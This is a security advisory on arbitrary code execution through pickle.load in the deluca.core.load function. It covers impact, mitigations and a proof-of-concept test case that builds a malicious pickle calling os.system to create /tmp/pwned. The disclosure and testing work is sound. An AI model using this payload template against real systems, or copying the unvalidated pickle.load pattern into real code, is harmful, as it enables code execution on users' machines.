### Unsafe Deserialization via Pickle in `deluca.core.load`

- **Vulnerability Name:** Unsafe Deserialization via Pickle in `deluca.core.load`

- **Description:**
    - The `deluca.core.load` function is used to load Python objects from files. This function utilizes the `pickle.load` method from Python's `pickle` library for deserialization.
    - An attacker can create a malicious file containing a pickled Python object.
    - This malicious pickled object can be designed to execute arbitrary code when it is deserialized using `pickle.load`.
    - If a user loads a model or data from an untrusted source using `deluca.core.load` and that source has been compromised or is malicious, the attacker's code will be executed on the user's system.
    - Specifically, if an attacker can control or influence the `path` argument provided to the `deluca.core.load` function, they can point it to their malicious pickle file. When `deluca.core.load` is called with the attacker-controlled path, `pickle.load` deserializes the malicious object, and during deserialization, the malicious code embedded within the pickle file is executed, leading to arbitrary code execution.

- **Impact:**
    - **Critical:** Remote Code Execution (RCE). Successful exploitation of this vulnerability allows an attacker to execute arbitrary Python code on the machine of a user who loads the malicious file. This can lead to complete system compromise, data theft, malware installation, or any other malicious action the attacker desires.
    - Full system compromise, including unauthorized access to data, system modifications, and potential data breaches.
    - In reinforcement learning systems, this could be exploited during model loading, potentially compromising the training process or deployed models.

- **Vulnerability Rank:** critical

- **Currently Implemented Mitigations:**
    - None. The codebase directly employs `pickle.load` without any input validation, sanitization, or security measures to prevent deserialization of malicious data. The code directly uses `pickle.load` without any input validation or security considerations.

- **Missing Mitigations:**
    - **Replace `pickle` with a safer serialization format:** The most effective mitigation is to avoid using `pickle` for loading models or data from potentially untrusted sources. Consider using safer alternatives like:
        - **JSON:** Suitable for simple data structures and widely supported, but may not be adequate for complex Python objects.
        - **Protocol Buffers (protobuf):** A language-neutral, platform-neutral, extensible mechanism for serializing structured data. More robust and efficient than pickle, and designed with security in mind.
        - **MessagePack:** An efficient binary serialization format, also safer than pickle.
    - **Input Validation and Sanitization (If `pickle` must be used):** If replacing `pickle` is not feasible, rigorous input validation is crucial. However, this approach is generally discouraged for `pickle` due to its inherent insecurity:
        - **Verify the source of the file:** Ensure that files loaded using `deluca.core.load` originate from trusted sources only.
        - **Implement integrity checks:** Use cryptographic hashes to verify the integrity of the pickled file before loading.
        - **Restrict file access:** Limit the file system permissions of the application using `deluca.core.load` to minimize potential damage from malicious code execution.
    - **Sandboxing or Isolation (If `pickle` must be used):**  Execute `deluca.core.load` within a sandboxed or isolated environment. This can limit the damage if malicious code is executed, as the sandbox can restrict access to sensitive system resources and functionalities.
    - **Principle of least privilege.** Ensure that the application using `deluca` and loading potentially pickled files runs with the minimum necessary privileges to limit the impact of successful exploitation.

- **Preconditions:**
    - The attacker must be able to create a malicious pickled file.
    - A user must execute code that uses `deluca.core.load` to load this malicious file. This could occur if a user downloads a model from an untrusted source or if an attacker can somehow replace a legitimate model file with a malicious one.
    - Attacker can control or influence the file path argument passed to the `deluca.core.load` function. This could happen through various means, such as:
        - Configuration file injection if the path is read from a configuration.
        - Command injection if the path is constructed from user input in a command-line interface.
        - Social engineering to trick a user into loading a malicious file.
    - An attacker needs to be able to supply a malicious file to be loaded by a `deluca` application using `deluca.core.load`. This could be achieved through various means, such as:
        - Social engineering to trick a user into loading the file.
        - Exploiting another vulnerability in the application that allows file uploads or file path manipulation.
        - If the application processes configuration files or policy data from external sources (e.g., downloaded from the internet or read from a network share), and if these files are loaded using `deluca.core.load`, an attacker could compromise these sources.

- **Source Code Analysis:**
    - File: `/code/deluca/core.py`
    - Function: `load(path)`
    ```python
    import pickle

    def load(path):
      return pickle.load(open(path, "rb"))
    ```
    - The `load` function opens the file specified by `path` in binary read mode (`"rb"`) and directly passes the file object to `pickle.load()`.
    - `pickle.load()` deserializes the byte stream from the file and reconstructs Python objects in memory.
    - The `pickle` protocol is known to be vulnerable to arbitrary code execution because the pickled data can contain instructions for building arbitrary Python objects, including those that execute system commands or other malicious operations during the deserialization process.
    - There are no checks on the file's content or origin before `pickle.load()` is called, making the system vulnerable to loading malicious pickled files.
    - **Vulnerability Point:** The `pickle.load(open(path, "rb"))` line directly deserializes data from the file specified by `path` using the `pickle` module.
    - **Attack Vector:** An attacker provides a crafted file at `path`. When `load(path)` is called, `pickle.load` executes malicious code within the file.
    - **Visualization:**
    ```
    [Attacker] --> Malicious Pickle File --> [System] --> deluca.core.load() --> Arbitrary Code Execution
    ```

- **Security Test Case:**
    - Step 1: Create a malicious pickled file named `malicious_model.pkl`. This file will contain a pickled object that executes a system command when loaded.
        ```python
        import pickle
        import os

        class MaliciousModel:
            def __reduce__(self):
                # This command will create a file named 'pwned' in the /tmp directory
                return (os.system, ('touch /tmp/pwned',))

        malicious_model = MaliciousModel()
        with open('malicious_model.pkl', 'wb') as f:
            pickle.dump(malicious_model, f)
        ```
    - Step 2: Create a Python script `load_model.py` (or `test_exploit.py`) that uses `deluca.core.load` to load the `malicious_model.pkl` file.
        ```python
        from deluca.core import load
        import os

        file_path = 'malicious_model.pkl'  # Path to the malicious pickle file
        try:
            loaded_obj = load(file_path)
            print("File loaded (this line might not be reached if exploit is successful before)")
        except Exception as e:
            print(f"Error during loading: {e}")

        if os.path.exists('/tmp/pwned'):
            print("/tmp/pwned file exists - Vulnerability confirmed!")
        else:
            print("/tmp/pwned file does NOT exist - Vulnerability NOT confirmed!")
        ```
    - Step 3: Run `load_model.py`.
        ```bash
        python load_model.py
        ```
    - Step 4: Check for successful exploitation. After running `load_model.py`, verify if the file `/tmp/pwned` has been created.
        ```bash
        ls /tmp/pwned
        ```
        - If the file `/tmp/pwned` exists, it indicates that the malicious code within `malicious_model.pkl` was successfully executed when `pickle.load` was called by `deluca.core.load`, confirming the vulnerability. If the command `ls /tmp/pwned` returns "ls: cannot access '/tmp/pwned': No such file or directory", then the vulnerability was not successfully exploited in this test environment. However, in a vulnerable environment, the file `/tmp/pwned` should be created.
    - Step 5: Cleanup (after testing): Delete the `malicious_model.pkl` file and `/tmp/pwned` (if created).
